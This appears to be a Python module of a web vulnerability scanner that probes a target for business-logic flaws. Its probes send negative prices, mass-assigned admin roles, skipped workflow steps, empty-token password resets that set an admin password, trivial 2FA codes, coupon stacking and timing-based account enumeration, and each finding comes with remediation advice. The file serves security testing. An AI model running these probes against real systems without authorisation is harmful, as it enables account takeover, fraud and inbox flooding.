"""
AmonStrike — Business Logic Testing Module
The bugs automation misses. The bugs humans find.
But we can automate a lot more than most think.

Tests:
  1. Negative price / quantity manipulation
  2. Coupon/promo code stacking
  3. Workflow bypass (skip payment steps)
  4. Parameter tampering (role escalation)
  5. Mass assignment (add extra params)
  6. Account enumeration via timing
  7. Password reset flow bypass
  8. Email verification bypass
  9. 2FA bypass
  10. IDOR via mass assignment
"""

import re
import time
import threading
from .base import BaseModule


class BusinessLogicModule(BaseModule):
    NAME        = "business_logic"
    DESCRIPTION = "Business logic — price tampering, workflow bypass, mass assignment"

    def run(self):
        self.log("Testing business logic vulnerabilities...")
        self._test_price_manipulation()
        self._test_workflow_bypass()
        self._test_mass_assignment()
        self._test_account_enumeration()
        self._test_password_reset_bypass()
        self._test_2fa_bypass()
        self._test_coupon_stacking()
        self._test_negative_values()
        self.log(f"Business logic scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _test_price_manipulation(self):
        """Attempt to manipulate prices in checkout flows."""
        checkout_paths = [
            "/api/cart/checkout", "/api/order", "/api/purchase",
            "/checkout", "/api/payment", "/api/buy",
        ]
        for path in checkout_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            # Try negative price
            for price_val in ["-1", "-0.01", "0", "0.001"]:
                resp = self.post(path, json={
                    "amount": price_val,
                    "price":  price_val,
                    "total":  price_val,
                    "items":  [{"id": 1, "quantity": 1, "price": price_val}]
                })
                if resp and resp.status_code in [200, 201]:
                    if any(w in resp.text.lower() for w in
                           ["success","order","confirm","purchased"]):
                        self.add_finding(
                            title=f"Business Logic — Price Manipulation: {price_val}",
                            severity="CRITICAL",
                            description=f"Sending price={price_val} to checkout endpoint returns success. Could allow purchasing items for free or negative cost.",
                            evidence=f"POST {path}\nbody: price={price_val}\nResponse: {resp.text[:200]}",
                            remediation="Validate prices server-side using the product catalog. Never trust client-supplied prices.",
                            url=self.url+path, cve="CWE-20"
                        )

    def _test_workflow_bypass(self):
        """Try to skip steps in multi-step workflows."""
        # Try to access step 3 of checkout without step 1/2
        step_paths = [
            ("/api/checkout/confirm",    "Checkout confirmation without cart"),
            ("/api/order/complete",      "Order completion without payment"),
            ("/api/payment/success",     "Payment success without transaction"),
            ("/admin/approve",           "Admin approve without admin role"),
            ("/api/verify-email/skip",   "Email verification skip"),
        ]
        for path, label in step_paths:
            r = self.get(path)
            if r and r.status_code == 200:
                self.add_finding(
                    title=f"Workflow Bypass — {label}",
                    severity="HIGH",
                    description=f"Step {path} is accessible directly without completing prior workflow steps.",
                    evidence=f"GET {path} → HTTP 200 OK\n{r.text[:200]}",
                    remediation="Implement server-side state machine for multi-step workflows. Each step must verify prior steps completed.",
                    url=self.url+path, cve="CWE-284"
                )

    def _test_mass_assignment(self):
        """Try adding extra parameters to see if they're accepted."""
        register_paths = [
            "/api/register", "/api/signup", "/api/users",
            "/api/profile", "/register",
        ]
        extra_params = [
            ("role",       "admin"),
            ("is_admin",   "true"),
            ("admin",      "1"),
            ("is_staff",   "true"),
            ("permission", "admin"),
            ("verified",   "true"),
            ("credit",     "10000"),
            ("balance",    "99999"),
        ]

        for path in register_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            for param, value in extra_params:
                resp = self.post(path, json={
                    "username":    "testuser_ma",
                    "email":       "test@test.com",
                    "password":    "Test1234!",
                    param:          value,
                })
                if resp and resp.status_code in [200, 201]:
                    resp_text = resp.text.lower()
                    if param in resp_text or value in resp_text:
                        self.add_finding(
                            title=f"Mass Assignment — {param}={value} Reflected in Response",
                            severity="HIGH",
                            description=f"Extra parameter '{param}={value}' sent to {path} appears in response, suggesting mass assignment vulnerability.",
                            evidence=f"POST {path}\nbody: {{'username':'test','{param}':'{value}'}}\nResponse contains '{param}' or '{value}'",
                            remediation="Use explicit allowlists for accepted fields. Implement DTO pattern. Never pass raw request body to ORM.",
                            url=self.url+path, cve="CWE-915"
                        )

    def _test_account_enumeration(self):
        """Detect account enumeration via response timing/content."""
        login_paths = ["/api/login", "/login", "/api/auth/login"]

        for path in login_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            # Compare response times for existing vs non-existing users
            times_existing    = []
            times_nonexistent = []

            for _ in range(3):
                t1 = time.time()
                self.post(path, json={
                    "username": "admin",
                    "password": "wrongpassword123!"
                })
                times_existing.append(time.time()-t1)

                t2 = time.time()
                self.post(path, json={
                    "username": f"nonexistent_{int(time.time())}",
                    "password": "wrongpassword123!"
                })
                times_nonexistent.append(time.time()-t2)

            avg_exist = sum(times_existing) / len(times_existing)
            avg_nonex = sum(times_nonexistent) / len(times_nonexistent)

            # Significant timing difference = enumeration
            if abs(avg_exist - avg_nonex) > 0.2:
                self.add_finding(
                    title="Account Enumeration via Response Timing",
                    severity="MEDIUM",
                    description=f"Login endpoint responds differently (timing) for existing vs non-existing accounts. Existing: {avg_exist:.3f}s, Non-existing: {avg_nonex:.3f}s",
                    evidence=f"Timing difference: {abs(avg_exist-avg_nonex):.3f}s ({avg_exist:.3f}s vs {avg_nonex:.3f}s)",
                    remediation="Ensure constant-time comparison for credentials. Use same bcrypt rounds regardless of user existence.",
                    url=self.url+path, cve="CWE-208"
                )

            # Also check response content differences
            r1 = self.post(path, json={"username":"admin","password":"wrong!"})
            r2 = self.post(path, json={"username":f"nonexistent_{int(time.time())}","password":"wrong!"})
            if r1 and r2:
                if r1.text != r2.text and len(r1.text) > 10:
                    self.add_finding(
                        title="Account Enumeration via Distinct Error Messages",
                        severity="MEDIUM",
                        description="Login returns different messages for existing vs non-existing users, enabling account enumeration.",
                        evidence=f"Existing user: {r1.text[:100]}\nNon-existing: {r2.text[:100]}",
                        remediation="Return identical error messages for all failed login attempts.",
                        url=self.url+path, cve="CWE-204"
                    )

    def _test_password_reset_bypass(self):
        """Test password reset flow for bypass vulnerabilities."""
        reset_paths = [
            "/api/forgot-password", "/api/reset-password",
            "/forgot-password", "/password-reset",
        ]
        for path in reset_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            # Test: Reset token not required
            resp = self.post(path + "/confirm", json={
                "token":        "",
                "new_password": "hacked123!",
                "email":        "admin@target.com",
            })
            if resp and resp.status_code in [200, 201]:
                if "success" in resp.text.lower() or "password" in resp.text.lower():
                    self.add_finding(
                        title="Password Reset Bypass — Empty Token Accepted",
                        severity="CRITICAL",
                        description="Password reset accepts empty token, allowing account takeover without valid reset link.",
                        evidence=f"POST {path}/confirm with empty token returned success",
                        remediation="Require non-empty, cryptographically random reset tokens. Validate server-side.",
                        url=self.url+path, cve="CWE-640"
                    )

            # Test: Rate limiting on reset
            responses = []
            for i in range(10):
                resp = self.post(path, json={"email": "admin@target.com"})
                if resp:
                    responses.append(resp.status_code)
            if responses.count(200) > 5:
                self.add_finding(
                    title="Password Reset — No Rate Limiting (Email Bombing)",
                    severity="MEDIUM",
                    description="Password reset endpoint has no rate limiting. Attacker can flood victim's inbox.",
                    evidence=f"10 reset requests accepted without rate limit error",
                    remediation="Limit password reset requests to 3-5 per hour per email address.",
                    url=self.url+path, cve="CWE-307"
                )

    def _test_2fa_bypass(self):
        """Test 2FA bypass techniques."""
        twofa_paths = [
            "/api/2fa/verify", "/api/mfa/verify",
            "/api/otp/verify", "/2fa", "/verify-otp",
        ]
        for path in twofa_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            # Test: Empty/null OTP
            for otp in ["", "000000", "null", "0", "123456"]:
                resp = self.post(path, json={"otp": otp, "code": otp, "token": otp})
                if resp and resp.status_code in [200, 201]:
                    if any(w in resp.text.lower() for w in
                           ["success","verified","dashboard","token"]):
                        self.add_finding(
                            title=f"2FA Bypass — Code '{otp}' Accepted",
                            severity="CRITICAL",
                            description=f"2FA verification accepts trivial code '{otp}'. Authenticator second factor completely bypassed.",
                            evidence=f"POST {path}\nbody: otp={otp!r}\nResponse: success",
                            remediation="Validate OTP server-side using TOTP algorithm. Reject empty, null, and obviously invalid codes.",
                            url=self.url+path, cve="CWE-287"
                        )
                        break

    def _test_coupon_stacking(self):
        """Test applying multiple coupons simultaneously."""
        coupon_paths = [
            "/api/coupon/apply", "/api/promo", "/api/discount",
            "/api/cart/coupon", "/checkout/coupon",
        ]
        for path in coupon_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            # Apply multiple coupons in one request
            resp = self.post(path, json={
                "codes":   ["SAVE10", "SAVE20", "SAVE50"],
                "coupon":  "SAVE10",
                "coupons": ["SAVE10", "SAVE20", "SAVE50"],
            })
            if resp and resp.status_code in [200, 201]:
                if any(w in resp.text.lower() for w in
                       ["discount","applied","success","savings"]):
                    self.add_finding(
                        title="Business Logic — Multiple Coupon Stacking",
                        severity="HIGH",
                        description="Application may allow applying multiple coupons simultaneously, bypassing intended discount limits.",
                        evidence=f"POST {path} with multiple codes returned success",
                        remediation="Enforce one coupon per order server-side. Validate before applying each discount.",
                        url=self.url+path, cve="CWE-840"
                    )

    def _test_negative_values(self):
        """Test negative quantity in cart/transfer."""
        cart_paths = [
            "/api/cart/add", "/api/cart/update",
            "/api/cart", "/cart/add",
        ]
        for path in cart_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            resp = self.post(path, json={
                "product_id": 1,
                "quantity":   -1,
                "qty":        -1,
                "amount":     -1,
            })
            if resp and resp.status_code in [200, 201]:
                self.add_finding(
                    title="Business Logic — Negative Quantity Accepted",
                    severity="HIGH",
                    description="Cart accepts negative quantity values, potentially allowing price reduction or free credits.",
                    evidence=f"POST {path} with quantity=-1 returned HTTP 200",
                    remediation="Validate quantity is a positive integer on server-side. Reject zero and negative values.",
                    url=self.url+path, cve="CWE-20"
                )
